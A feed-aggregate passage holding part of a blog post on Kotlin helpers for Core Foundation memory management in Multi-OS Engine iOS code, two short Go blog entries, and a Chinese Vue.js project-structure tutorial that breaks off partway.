// Helper function to convert a CF type to Cocoa type
fun OpaquePtr.toNSObject() = ObjCRuntime.cast(this, NSObject::class.java)

val privateKeyAttrs = NSMutableDictionary.dictionary&lt;Any, Any>() as NSMutableDictionary&lt;Any, Any>
privateKeyAttrs[Security.kSecAttrIsPermanent().toNSObject()] = NSNumber.numberWithBool(true) // Convert Java `boolean` to Cocoa type
privateKeyAttrs[Security.kSecAttrApplicationTag().toNSObject()] = tag
privateKeyAttrs[Security.kSecAttrAccessControl().toNSObject()] = access.toNSObject()

val attributes = NSMutableDictionary.dictionary&lt;Any, Any>() as NSMutableDictionary&lt;Any, Any>
attributes[Security.kSecClass().toNSObject()] = Security.kSecClassKey().toNSObject()
attributes[Security.kSecAttrKeyType().toNSObject()] = Security.kSecAttrKeyTypeECSECPrimeRandom().toNSObject()
attributes[Security.kSecAttrKeySizeInBits().toNSObject()] = NSNumber.numberWithInt(256) // Convert Java `int` to Cocoa type
attributes[Security.kSecAttrTokenID().toNSObject()] = Security.kSecAttrTokenIDSecureEnclave().toNSObject()
attributes[Security.kSecPrivateKeyAttrs().toNSObject()] = privateKeyAttrs

// Cast NSDictionary to CFDictionaryRef
val cfAttributes = ObjCRuntime.cast(attributes, CFDictionaryRef::class.java)

val privateKey = Security.SecKeyCreateRandomKey(cfAttributes, pError)</pre>



<p>With the help of <a href="https://github.com/Noisyfox/NatJ-Kotlin">this library</a> I created, the code can be simplified as:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val pError = PtrFactory.newOpaquePtrReference(CFErrorRef::class.java)

val access = Security.SecAccessControlCreateWithFlags(
    CoreFoundation.CFAllocatorGetDefault(),
    Security.kSecAttrAccessibleWhenUnlockedThisDeviceOnly(),
    SecAccessControlCreateFlags.PrivateKeyUsage or SecAccessControlCreateFlags.UserPresence,
    pError
)

val attributes = mapOf&lt;Any,Any>(
    Security.kSecClass() to Security.kSecClassKey(),
    Security.kSecAttrKeyType() to Security.kSecAttrKeyTypeECSECPrimeRandom(),
    Security.kSecAttrKeySizeInBits() to 256,
    Security.kSecAttrTokenID() to Security.kSecAttrTokenIDSecureEnclave(),
    Security.kSecPrivateKeyAttrs() to mapOf&lt;Any,Any>(
        Security.kSecAttrIsPermanent() to true,
        Security.kSecAttrApplicationTag() to "some tag".toNSData(),
        Security.kSecAttrAccessControl() to access
    )
).toNSDictionary()

val privateKey = Security.SecKeyCreateRandomKey(attributes.bridge(), pError)</pre>



<p>This library also has a help function for creating <code>NSArray</code> from a Java <code>Collection</code>:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val nsArray = listOf(1, 2, 3, "some string", someCFRef, someNSType).toNSArray()</pre>



<h1>Toll-Free Bridging &amp; Memory Management</h1>



<p>iOS developers are most likely to be familiar with&nbsp;<strong>Cocoa Touch</strong>&nbsp;frameworks/APIs (does&nbsp;<strong>Foundation</strong>&nbsp;framework sound familiar to you?), which use the programming languages&nbsp;<strong>Objective-C</strong>&nbsp;or&nbsp;<strong>Swift</strong>. </p>



<p>However, you may also heard about another framework called&nbsp;<strong>Core Foundation</strong>.&nbsp;It is a pure&nbsp;<strong>C</strong>&nbsp;framework and provides access to lower level APIs and types.</p>



<p>For iOS development, most frameworks you will use are all designed based on the&nbsp;<strong>Foundation</strong>&nbsp;framework which means the types they use are all&nbsp;<code>NSObject</code>s so&nbsp;<strong>ARC</strong>&nbsp;manages the memory for you and the memory will be automatically released when the object is no longer used.&nbsp;<strong>MOE</strong> does some tricks so&nbsp;<strong>Java</strong>&#8216;s&nbsp;<strong>GC</strong>&nbsp;also helps when you use those types on&nbsp;<strong>Java</strong>&nbsp;side.</p>



<p>However some low level functions (such as&nbsp;<strong>Security</strong>&nbsp;framework if you try to use&nbsp;<strong>TouchId</strong>) are available in only&nbsp;<strong>C</strong>&nbsp;functions. Hens they use&nbsp;<strong>Core Foundation</strong>&nbsp;types which does not have&nbsp;<strong>ARC</strong>&nbsp;and requires manual memory management. Sadly&nbsp;<strong>Java</strong>&#8216;s&nbsp;<strong>GC</strong>&nbsp;does no help here (and may even create new issues which I will talk about later).</p>



<h2 id="ownership-cfretain-and-cfrelease">Ownership, CFRetain() and CFRelease()</h2>



<p>Anyone has any&nbsp;<strong>C</strong>&nbsp;experience might still remember those good old days struggling with&nbsp;<code>malloc()</code>&nbsp;and&nbsp;<code>free()</code>&nbsp;while&nbsp;<strong>Core Foundation</strong>&nbsp;brings you&nbsp;<code>CFRetain()</code>&nbsp;and&nbsp;<code>CFRelease()</code>.</p>



<p>Apple has a fantastic document that tells you how&nbsp;<em>Ownership</em>&nbsp;works in manual memory management and when you should use&nbsp;<code>CFRetain()</code>and&nbsp;<code>CFRelease()</code>&nbsp;respectively. I highly recommend you to read it first:</p>



<p>Link:&nbsp;<a href="https://developer.apple.com/library/archive/documentation/CoreFoundation/Conceptual/CFMemoryMgmt/Concepts/Ownership.html">Memory Management Programming Guide for Core Foundation &#8211; Ownership Policy</a></p>



<p>Basically if an Core Foundation object is owned by you, you need to call&nbsp;<code>CFRelease()</code>&nbsp;once you are done with it; if it&#8217;s NOT owned by you, in most cases, you need to&nbsp;<code>CFRetain()</code>&nbsp;it, use it, then&nbsp;<code>CFRelease()</code>&nbsp;it afterwards:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// Create a CFString, which is owned by you
CFStringRef urlStr = CFStringCreateWithCString(kCFAllocatorDefault,
    "https://www.noisyfox.io", kCFStringEncodingUTF8);

/* Do something with urlStr here. */

// Release it afterwards
CFRelease(urlStr);
</pre>



<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// Get something from a dict, which is not owned, so a CFRetain() is required
CFStringRef title = (CFStringRef)CFRetain(CFDictionaryGetValue(dict, CFSTR("title")));

/* Do something with title here. */

// Release it afterwards
CFRelease(urlStr);
</pre>



<p>You can easily convert above code to&nbsp;<strong>Java</strong>&nbsp;since MOE bindings provide all necessary functions. And with a little help from my library, you could write something like these in&nbsp;<strong>Kotlin</strong>:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">CFStringCreateWithCString(kCFAllocatorDefault(), "title", CFStringBuiltInEncodings.UTF8).use { key ->

    CFDictionaryGetValue(dict, key).cast&lt;CFStringRef>().retain().use { title ->
        /* Do something with title here. */
    }
}
// CFRelease is automatically called when block returns
</pre>



<p>The&nbsp;<code>action</code>&nbsp;block of&nbsp;<code>.use()</code>&nbsp;is wrapped in a&nbsp;<code>try</code>&nbsp;block so the resource is guaranteed to be released even if&nbsp;<strong>Exception</strong>&nbsp;is raised in the block.</p>



<h2 id="autoreleasepool-for-core-foundation-types"><code>autoreleasepool</code>&nbsp;for&nbsp;<strong>Core Foundation</strong>&nbsp;types</h2>



<p><code>.use()</code>&nbsp;mentioned above will create a lot of nested scopes if you have a lot of those&nbsp;<strong>Core Foundation</strong>&nbsp;objects. That makes the code unreadable. With the help of&nbsp;<code>autoreleasepool</code>&nbsp;you could rewrite the above code to something like this:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">autoreleasepool {
    val key = CFStringCreateWithCString(kCFAllocatorDefault(), "title", CFStringBuiltInEncodings.UTF8).autorelease()
    val title = CFDictionaryGetValue(dict, key).cast&lt;CFStringRef>().retain().autorelease()

    /* Do something with title here. */
}
// CFRelease is automatically called for each object that called .autorelease() when autoreleasepool block ends
</pre>



<p><strong>NB</strong>: Make sure the&nbsp;<code>autoreleasepool</code>&nbsp;you called is imported from package&nbsp;<code>io.noisyfox.moe.natj</code>&nbsp;since&nbsp;<strong>NatJ</strong>&nbsp;has it&#8217;s own impl&nbsp;<code>org.moe.natj.objc.ObjCRuntime#autoreleasepool(java.lang.Runnable)</code>&nbsp;which is not a&nbsp;<strong>Kotlin</strong>&nbsp;<code>inline</code>&nbsp;function which doesn&#8217;t support certain features (such as&nbsp;<a href="https://kotlinlang.org/docs/reference/inline-functions.html#non-local-returns">non-local returns</a>&nbsp;and&nbsp;<a href="https://kotlinlang.org/docs/reference/inline-functions.html#reified-type-parameters">reified type parameters</a>).</p>



<h2 id="type-bridging">Type Bridging</h2>



<p>WIP</p>



<h1>Misc</h1>



<p>The library also contains some other help functions for converting between Java types and native types such as <code>ByteArray</code> &lt;=&gt; <code>NSData</code>. I won&#8217;t list all functions here since you could easily find them in source code.</p>



<h1>The library &#8211; <strong><a href="https://github.com/Noisyfox/NatJ-Kotlin">NatJ-Kotlin</a></strong></h1>



<p>This is a library I created that contains some helper functions I used in my work. It&#8217;s currently available in only source code form. I will create a jar release and publish it to jcenter ASAP.</p>



<p>The library is written in Kotlin but most of the functions can also be used in Java.</p>



<h1>Discussion</h1>



<p>Any idea of  library improving are welcomed. If you found any mistake in my post, or have any other problem that is not covered, please not hesitate to share with us by leaving comments.</p>
<p><a rel="nofollow" href="https://www.noisyfox.io/moe-native-types.html">Working with native types: Advanced</a>，首发于<a rel="nofollow" href="https://www.noisyfox.io">狐狸的小小窝</a>。</p>]]></content>
        <author>
            <name><![CDATA[狐狸的小小窝]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/06/go-internal-note/</id>
        <title><![CDATA[《深入解析Go》笔记]]></title>
        <updated>2019-06-24T08:40:49+08:00</updated>
        <link href="https://blog.stdioa.com/2019/06/go-internal-note/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/06/go-internal-note/"><![CDATA[<p>在 GitHub 上找到一本解读 Go 实现细节的好书，名叫<a href="https://github.com/tiancaiamao/go-internals/" target="_blank" rel="noopener">《深入解析 Go》</a>。<br>大致看了一遍，简单做了些笔记。</p>]]></content>
        <author>
            <name><![CDATA[Stdio’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/06/golang-learning-experience/</id>
        <title><![CDATA[Golang 学习记录]]></title>
        <updated>2019-06-24T08:25:39+08:00</updated>
        <link href="https://blog.stdioa.com/2019/06/golang-learning-experience/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/06/golang-learning-experience/"><![CDATA[<p>这几个月在考虑从 Python 转向 Golang，所以专门学习了 Golang.<br>这里是 Golang 学习的一些记录。</p>]]></content>
        <author>
            <name><![CDATA[Stdio’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/vue-demo-instruction/</id>
        <title><![CDATA[Vue.js 从入坑到入土]]></title>
        <updated>2019-04-23T13:25:25+08:00</updated>
        <link href="https://blog.creedowl.com/posts/vue-demo-instruction/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/vue-demo-instruction/"><![CDATA[<h1 id="vuejs-从入坑到入土">Vue.js 从入坑到入土</h1>
<p>近年来前端领域发展飞速，从最早的直接写html, js, css 到使用jQuery快速开发，再到近年来使用Vuejs，Reactjs 实现工程化开发，也就短短十几年。虽然前端项目结构越来越复杂，但也越来越规范，清晰，更加工程化。当前较为流行的前端框架有Vuejs、Reactjs、Angularjs 等，而Vuejs由于其灵(zhong)活(wen)轻(wen)便(dang)，较为流行。虽然Vuejs有完善的中文文档，但文档主要在介绍其用法，缺少如何实现一个完整项目的指导，本文就介绍如何用Vuejs创建一个完整的前端项目，并与后端进行交互。</p>
<p><strong>本文基于<a href="mailto:Vuejs@2.x">Vuejs@2.x</a>及<a href="mailto:VueCLI@3.x">VueCLI@3.x</a></strong></p>
<ol>
<li>所需技术栈：html, javascript, css基础知识，其中js建议了解<strong>ES2015</strong>标准，特别要掌握<strong>promise</strong>的使用</li>
<li>使用的工具：<del>宇宙第一编辑器</del> VSCode —— 现在对vue项目的支持已经很好了，可以自动安装vue项目需要的插件</li>
</ol>
<h1 id="0x0-安装">0x0 安装</h1>
<blockquote>
<p>推荐使用<a href="https://yarnpkg.com/lang/zh-hans">yarn</a>代替npm作为包管理器</p>
</blockquote>
<h2 id="安装vuecli">安装VueCLI</h2>
<blockquote>
<p>VueCLI是Vuejs官方推出的项目脚手架工具，可以方便的创建、管理Vue项目，还提供优雅的web管理界面</p>
</blockquote>
<p>全局安装<a href="https://cli.vuejs.org/zh/">VueCLI</a></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">yarn global add @vue/cli
</code></pre></div><h2 id="安装vue-devtools">安装Vue-devtools</h2>
<blockquote>
<p><a href="https://github.com/vuejs/vue-devtools">Vue-devtools</a> 是vue官方的浏览器开发插件，可以方便的在浏览器中调试vue应用</p>
</blockquote>
<p>Vue-devtools 提供多平台的浏览器插件可以直接安装使用</p>
<p><a href="https://github.com/vuejs/vue-devtools#installation">installation</a></p>
<h1 id="0x1-新建项目">0x1 新建项目</h1>
<p>使用 <code>vue create vue_demo</code> 创建新项目，接下来会出现一个交互式命令行帮你配置项目。</p>
<p><strong>注意此处不要使用默认的配置！具体配置参考下图</strong></p>
<blockquote>
<p>坑x1 默认的配置十分简单，新手经常不知道怎么写多页面，弄不明白项目怎么组织的，所以需要自定义配置，添加vue-router插件实现多页面跳转</p>
</blockquote>
<p><a href="https://asciinema.org/a/240155"><img src="https://asciinema.org/a/240155.svg" alt="asciicast"></a></p>
<h1 id="0x2-项目框架">0x2 项目框架</h1>
<p>此时项目已经创建成功，如果你按照提示启动项目就能看到经典的vue启动页</p>
<p><img src="http://ww1.sinaimg.cn/large/0071ouepgy1g1yg2r5ysxj30up0mx3zv.jpg" alt="image"></p>
<p>当前的项目结构如下</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">.                     项目根目录
├── README.md 
├── babel.config.js
├── package.json      项目主配置文件
├── public            公共资源文件夹
│   ├── favicon.ico
│   └── index.html    入口html
├── src               源码根目录
│   ├── App.vue       入口文件
│   ├── assets        资源文件夹
│   │   └── logo.png
│   ├── components    组件文件夹
│   │   └── HelloWorld.vue 
│   ├── main.js       入口配置文件
│   ├── router.js     路由文件
│   ├── store.js      状态管理
│   └── views         页面文件夹
│       ├── About.vue
│       └── Home.vue
└── yarn.lock         依赖文件
</code></pre></div><p>在下面的章节具体介绍各个文件、文件夹的用处和如何组织项目。</p>
<h1 id="0x3-项目结构">0x3 项目结构</h1>
<p>用vue开发的项目一般是<a href="https://zh.wikipedia.org/wiki/%E5%8D%95%E9%A1%B5%E5%BA%94%E7%94%A8">SPA(单页应用)</a>，通过动态重写当前页面来与用户交互，而不会重新加载整个新页面。所以要组织多页面就要通过vue-router来组织页面，而vuex用来保存状态。</p>
<p>作为单页应用，当然需要一个入口html文件，也就是 <code>public/index.html</code> :</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">public/index.html

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;utf-8&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;X-UA-Compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;IE=edge&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width,initial-scale=1.0&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;icon&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&lt;%= BASE_URL %&gt;favicon.ico&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>vue_demo<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">noscript</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">strong</span><span class="p">&gt;</span>We&#39;re sorry but vue_demo doesn&#39;t work properly without JavaScript enabled. Please enable it to continue.<span class="p">&lt;/</span><span class="nt">strong</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">noscript</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="c">&lt;!-- built files will be auto injected --&gt;</span>
  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div><p>这是默认生成的 <code>index.html</code> ，而编译好的文件（网页内容）会被自动注入到 `` 中，也就意味着要使用vue开发的应用，浏览器必须支持js。</p>
<p>而#app所绑定的vue实例，则位于 <code>src/main.js</code></p>
<hr>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">main</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">App</span> <span class="nx">from</span> <span class="s1">&#39;./App.vue&#39;</span>
<span class="kr">import</span> <span class="nx">router</span> <span class="nx">from</span> <span class="s1">&#39;./router&#39;</span>
<span class="kr">import</span> <span class="nx">store</span> <span class="nx">from</span> <span class="s1">&#39;./store&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>
<span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="nx">router</span><span class="p">,</span> <span class="c1">// 使用vue-router插件
</span><span class="c1"></span>  <span class="nx">store</span><span class="p">,</span> <span class="c1">// 使用vuex插件
</span><span class="c1"></span>  <span class="nx">render</span><span class="o">:</span> <span class="nx">h</span> <span class="p">=&gt;</span> <span class="nx">h</span><span class="p">(</span><span class="nx">App</span><span class="p">)</span> <span class="c1">// 渲染页面
</span><span class="c1"></span><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span> <span class="c1">// 绑定到 index.html -&gt; div#app
</span></code></pre></div><p>其中渲染的页面位于 <code>src/App.vue</code></p>
<hr>
<blockquote>
<p>xxx.vue 是vue中的<a href="https://cn.vuejs.org/v2/guide/single-file-components.html">单文件组件</a>，将 <code>html css javascript</code> 集合在同一个文件，便于组织管理</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/App.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;nav&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">to</span><span class="o">=</span><span class="s">&#34;/&#34;</span><span class="p">&gt;</span>Home<span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">to</span><span class="o">=</span><span class="s">&#34;/about&#34;</span><span class="p">&gt;</span>About<span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">router-view</span><span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">#</span><span class="nn">app</span> <span class="p">{</span>
  <span class="k">font-family</span><span class="p">:</span> <span class="s1">&#39;Avenir&#39;</span><span class="p">,</span> <span class="n">Helvetica</span><span class="p">,</span> <span class="n">Arial</span><span class="p">,</span> <span class="kc">sans-serif</span><span class="p">;</span>
  <span class="kp">-webkit-</span><span class="n">font-smoothing</span><span class="p">:</span> <span class="n">antialiased</span><span class="p">;</span>
  <span class="kp">-moz-</span><span class="n">osx-font-smoothing</span><span class="p">:</span> <span class="n">grayscale</span><span class="p">;</span>
  <span class="k">text-align</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#2c3e50</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="p">{</span>
  <span class="k">padding</span><span class="p">:</span> <span class="mi">30</span><span class="kt">px</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="nt">a</span> <span class="p">{</span>
  <span class="k">font-weight</span><span class="p">:</span> <span class="kc">bold</span><span class="p">;</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#2c3e50</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="nt">a</span><span class="p">.</span><span class="nc">router-link-exact-active</span> <span class="p">{</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#42b983</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>其中 <code>是页面的 `html` 元素，`style` 是样式元素，还可以添加一个 `javascript` 为js元素。其中</code> 是路由组件，会被自动渲染成当前路由对应的页面</p>
<hr>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">router</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">Router</span> <span class="nx">from</span> <span class="s1">&#39;vue-router&#39;</span>
<span class="kr">import</span> <span class="nx">Home</span> <span class="nx">from</span> <span class="s1">&#39;./views/Home.vue&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Router</span><span class="p">)</span>
<span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Router</span><span class="p">({</span>
  <span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;history&#39;</span><span class="p">,</span>
  <span class="nx">base</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">BASE_URL</span><span class="p">,</span>
  <span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
    <span class="p">{</span>
      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span>
      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;home&#39;</span><span class="p">,</span>
      <span class="nx">component</span><span class="o">:</span> <span class="nx">Home</span>
    <span class="p">},</span>
    <span class="p">{</span>
      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/about&#39;</span><span class="p">,</span>
      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;about&#39;</span><span class="p">,</span>
      <span class="c1">// route level code-splitting
</span><span class="c1"></span>      <span class="c1">// this generates a separate chunk (about.[hash].js) for this route
</span><span class="c1"></span>      <span class="c1">// which is lazy-loaded when the route is visited.
</span><span class="c1"></span>      <span class="nx">component</span><span class="o">:</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="kr">import</span><span class="p">(</span><span class="cm">/* webpackChunkName: &#34;about&#34; */</span> <span class="s1">&#39;./views/About.vue&#39;</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">]</span>
<span class="p">})</span>
</code></pre></div><p>如 <code>http://localhost:8080/</code> 下 <code>被渲染成 `home` 页面，`http://localhost:8080/about` 下</code> 被渲染成 <code>about</code> 页面。</p>
<blockquote>
<p>技巧 这里加载组件使用函数加载，就可以实现懒加载以优化性能。</p>
</blockquote>
<hr>
<p><code>src/views/</code> 则是保存页面文件，例如</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/views/Home.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;home&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">alt</span><span class="o">=</span><span class="s">&#34;Vue logo&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;../assets/logo.png&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">HelloWorld</span> <span class="na">msg</span><span class="o">=</span><span class="s">&#34;Welcome to Your Vue.js App&#34;</span><span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="c1">// @ is an alias to /src
</span><span class="c1"></span><span class="kr">import</span> <span class="nx">HelloWorld</span> <span class="nx">from</span> <span class="s1">&#39;@/components/HelloWorld.vue&#39;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;home&#39;</span><span class="p">,</span>
  <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">HelloWorld</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div><p>这就是路由 <code>home</code> 对应的页面，其中用到了 <code>HelloWorld</code> 组件，需要在js中引入。</p>
<hr>
<p><code>src/components/</code> 里面保存可复用的组件，例如上面的 `` 就是一个独立的组件（component）</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/components/HelloWorld.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;hello&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>{{ msg }}<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
      For a guide and recipes on how to configure / customize this project,<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
      check out the
      <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://cli.vuejs.org&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;_blank&#34;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;noopener&#34;</span><span class="p">&gt;</span>vue-cli documentation<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>.
    <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;HelloWorld&#39;</span><span class="p">,</span>
  <span class="nx">props</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">msg</span><span class="o">:</span> <span class="nb">String</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="c">&lt;!-- Add &#34;scoped&#34; attribute to limit CSS to this component only --&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
<span class="nt">h1</span> <span class="p">{</span>
  <span class="k">margin</span><span class="p">:</span> <span class="mi">40</span><span class="kt">px</span> <span class="mi">0</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>这就是一个典型的组件，结构就是一个正常的单文本组件，说明组件就是把一部分页面逻辑抽出来组成一个文件。这样的好处是分离与页面无关的组件，使页面逻辑更加清晰，同时也便于复用组件。如果有以下情况，我建议把部分代码分离成独立的组件：</p>
<ol>
<li>需要多次复用的组件，如基础按钮、表单等</li>
<li>较为复杂但与页面逻辑无关的，如页面的Header、Footer等</li>
</ol>
<blockquote>
<p>技巧 在 <code>style</code> 表情上添加 <code>scoped</code> 属性可以限制CSS生效范围为该组件，不会影响其他元素，在编译时vue解释器会给这些css属性加上随机的hash保证唯一</p>
</blockquote>
<hr>
